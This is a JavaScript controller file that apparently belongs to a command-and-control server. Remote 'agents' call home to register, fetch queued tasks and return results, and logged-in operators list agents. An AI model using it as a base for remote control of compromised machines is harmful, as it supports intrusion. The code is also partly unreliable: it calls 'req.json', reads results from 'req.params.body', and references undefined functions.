/**
 * @file Controller code for the agent routes.
 * @author Umar Abdul
 */

import Agent, * as agentModel from '../models/agent.js';
import Task, * as taskModel from '../models/task.js';

/**
 * Create a new agent. Called when a new agent calls home.
 */
export const agentInit = (req, res) => {
  
  agentModel.createAgent(req.body).then(data => {
    socketServer.emit("new_agent", data.agent);
    return res.json(data.config);
  }).catch(error => {
    return res.status(500).json({error: error.message});
  });
};

/**
 * Get all agents. For authenticated users only.
 */
export const getAgents = (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json({error: "Permission denied!"});
  agentModel.getAgents().then(agents => {
    return res.json(agents);
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * Get an agent with given ID.
 */
export const getAgent = (req, res) => {

  if (req.session.loggedIn !== true)
    return res.status(403).json({error: "Permission denied!"});
  agentModel.getAgent(req.params.uid).then(agent => {
    return req.json(agent);
  }).catch(error => {
    return res.status(403).json({error: error.message});
  });
};

/**
 * Used by agents to receive all their queued tasks.
 */
export const getTasks = (req, res) => {

  const agentID = req.params.uid;
  taskModel.getTasks(agentID).then(tasks => {
    // Mark them as received.
    for (let task of tasks){
      try{
        taskModel.markReceived(task.uid); // No need to await
      }catch(err){
        console.log(err);
      }
    }
    return res.json(tasks);
  });
};

/**
 * Used by agents to submit the results of their tasks.
 */
export const setTasksResults = async (req, res) => {

  const agentID = req.params.uid;
  const results = req.params.body;
  if (!(results && results.length !== 0))
    return res.status(403).json({error: "No results defined!"});
  for (let result of results){
    try{
      await setResult(result.uid, result.result);
    }catch(error){
      console.log(error);
    }
  }
  return res.json({});
};
